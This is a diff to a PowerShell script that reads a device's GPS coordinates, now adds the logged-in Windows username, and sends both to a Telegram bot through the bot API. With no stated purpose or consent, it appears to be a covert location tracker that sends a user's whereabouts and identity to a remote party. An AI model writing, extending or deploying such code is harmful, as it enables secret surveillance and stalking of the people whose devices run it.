@@ -21,7 +21,8 @@ while (($watcher.Status -ne 'Ready') -and ($timeout -gt 0)) {
 if ($watcher.Status -eq 'Ready') {
     # Get the current position
     $position = $watcher.Position.Location
-    $textMessage = "Online | Latitude: $($position.Latitude), Longitude: $($position.Longitude)"
+    $username = $env:USERNAME
+    $textMessage = "Online | Username: $username | Latitude: $($position.Latitude), Longitude: $($position.Longitude)"
 } else {
     $textMessage = "Failed to determine the GPS location."
 }
@@ -29,6 +30,7 @@ if ($watcher.Status -eq 'Ready') {
 # Stop the watcher
 $watcher.Stop()
 
+# Send message to Telegram
 $apiUrl = "https://api.telegram.org/bot$botToken/sendMessage"
 $params = @{
     'chat_id'    = $chatId
